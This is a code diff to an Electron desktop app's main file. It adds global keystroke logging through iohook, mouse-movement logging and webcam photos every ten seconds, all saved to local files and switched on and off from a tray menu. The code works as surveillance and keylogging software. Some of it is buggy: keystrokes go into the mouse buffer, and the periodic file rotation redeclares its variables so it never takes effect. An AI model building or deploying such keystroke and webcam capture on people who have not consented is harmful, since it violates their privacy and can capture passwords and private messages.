@@ -1,6 +1,11 @@
 // Modules to control application life and create native browser window
 const {app, BrowserWindow,Tray,Menu} = require('electron')
 const path = require('path')
+
+console.log(__dirname);
+var IsEnable=true;
+var KeyIsEnable=true;
+var mouseIsEnable=true;
 // const iconPath=path.join(__dirname,"images.png");
 const url = require('url')
 function createWindow () {
@@ -14,7 +19,7 @@ function createWindow () {
     }
   
   })
- 
+
   // and load the index.html of the app.
   mainWindow.loadFile('index.html')
   mainWindow.setMenuBarVisibility(false)
@@ -33,8 +38,37 @@ app.whenReady().then(
     let trayIcon = new Tray(path.join(__dirname,"images.png"))
 
     const trayMenuTemplate = [
-     
-       
+    {label:"ScreenShot",submenu:[
+      { label: 'Enable ScreenShot', type: 'radio', click: function () {
+        IsEnable=true;
+      }
+        },
+     { label: 'Disable ScreenShot', type: 'radio', click: function () {
+      IsEnable=false;
+     }
+       }
+    ]},
+    {label:"Keyboard Logging",submenu:[
+      { label: 'Enable logging', type: 'radio', click: function () {
+        KeyIsEnable=true;
+      }
+        },
+     { label: 'Disable logging', type: 'radio', click: function () {
+      KeyIsEnable=false;
+     }
+       }
+    ]},
+    ,
+    {label:"Mouse Logging",submenu:[
+      { label: 'Enable logging', type: 'radio', click: function () {
+        mouseIsEnable=true;
+      }
+        },
+     { label: 'Disable logging', type: 'radio', click: function () {
+      mouseIsEnable=false;
+     }
+       }
+    ]},
        {
           label: 'Close Application',
           click: function () {
@@ -52,13 +86,19 @@ app.whenReady().then(
    //
    const ioHook = require('iohook');
    //const fs=require('fs');
-   var FileName="Images/"+getRandomInt(9999999999)+".txt";
-   let text="";
-   let main="";
+   var FileNameKey="Images/"+"Keyboard-"+getRandomInt(9999999999)+".txt";
+   var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
+   let text_key="";
+   let text_mouse="";
+   let main_key="";
+   let main_mouse="";
   setInterval(function(){
-     FileName="Images/"+getRandomInt(9999999999)+".txt";
-      text="";
-      main="";
+    var FileNameKey="Images/"+"Keyboard-"+getRandomInt(9999999999)+".txt";
+   var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
+   let text_key="";
+   let text_mouse="";
+   let main_key="";
+   let main_mouse="";
   },600000)
      
       
@@ -66,16 +106,38 @@ app.whenReady().then(
    ioHook.on('keydown', function(e)
    {
  
-    
-    text=String.fromCharCode(e.rawcode);
+    if(KeyIsEnable==true)
+    {
+        text_key=String.fromCharCode(e.rawcode);
  
-     main+=text;
-     fs.writeFileSync(FileName,main); 
+     main_mouse+=text_key;
+     fs.writeFileSync(FileNameKey,main_mouse); 
+    }
+  
     // document.getElementById("logs").innerHTML= main;
      
    });
-      
+   ioHook.on('mousemove', function(e)
+   {
  
+    if(mouseIsEnable==true)
+    {
+        text_mouse=e.x+","+e.y;
+ 
+     main_mouse+=text_mouse;
+     fs.writeFileSync(FileNameMouse,main_mouse); 
+    }
+  
+    // document.getElementById("logs").innerHTML= main;
+     
+   });
+//    var Mouse = require("node-mouse");
+ 
+//    var m = new Mouse();
+// m.on("click",function(event) {
+//     console.log(event);
+// });
+    
   
 // Register and start hook
 ioHook.start();
@@ -145,7 +207,10 @@ var opts = {
 var Webcam = NodeWebcam.create( opts );
  
 //Will automatically append location output type
+
 setInterval(function(){
+  if(IsEnable==true)
+  {
   Webcam.capture( "test_picture", function( err, data ) {
   // var file = urltoFile(data).then(function(file){
 
@@ -154,7 +219,11 @@ setInterval(function(){
   var file = decodeBase64Image(data);
   fs.writeFileSync("Images/"+getRandomInt(9999999999)+".png",file.data);
 } );
-},60000)
+  }else{
+    console.log(IsEnable);
+  }
+  
+},10000)
 
  
  
@@ -230,3 +299,4 @@ function decodeBase64Image(dataString) {
 function getRandomInt(max) {
   return Math.floor(Math.random() * Math.floor(max));
 }
+ 
